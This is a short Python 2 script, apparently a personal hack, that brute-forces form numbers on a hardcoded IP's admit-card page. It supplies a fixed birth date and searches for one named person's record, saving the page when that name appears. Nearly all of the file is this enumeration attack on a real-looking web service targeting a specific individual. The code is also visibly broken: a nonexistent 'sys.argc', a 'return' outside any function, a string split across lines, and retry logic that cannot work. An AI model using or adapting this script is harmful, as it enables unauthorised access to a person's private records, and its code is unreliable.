import urllib
import sys
import re
import time

# A few warnings: This particular code is fairly untested. Meaning I don't know how it 
# will react in a real error. Theoretically it should sleep for 30 seconds and retry.
# If it doesn't work, it'll probably destroy the internet as we know it for all I know.
# Secondly, If you modify the script to go backwards, modify the WHILE statement as well.
# Third. Run both this script and yours for safety.

if sys.argc < 3:
	print 'Please enter your data in this format: <first-name>
	<last-name> <dd> <mm> <yy>'
	return


x = 0 # This defines X as a globally accessible variable. See bottom.
def hack(start, end): # Mind you the actual function is called at the bottom.
	x = start
	while x < end:
		sock = urllib.urlopen("http://14.140.247.111/admitcard/wpadmitcard.asp?formno="+str(x)+"&dd=04&mm=05&yy=89")
		htmlsrc = sock.read()
		sock.close()

		if(re.search('CHETAN MISTARI',htmlsrc) is None):
			print str(x)+' not found. Still searching.'
			
			try:
				_f = open("ch_logfile.txt","w")
				_f.write(str(x)+'not found. Still Searching...')
				_f.close()
			except IOError:
				continue
			
			x += 1
			continue
			
		else:
			f = open("admitcard.htm","w+")
			print 'WE HAVE A WINNER:'+str(x)
			f.write(htmlsrc)
			f.close()
			sys.exit(0)		

			x += 1

try:
	hack(659999,665000)
	# This is where you start the hack by calling the function.
except IOError:
	time.sleep(30)
	hack(x,660000) # It should be fairly obvious that x will be incremented in the function
		       # And therefore in case of an Error, it continues from the last value
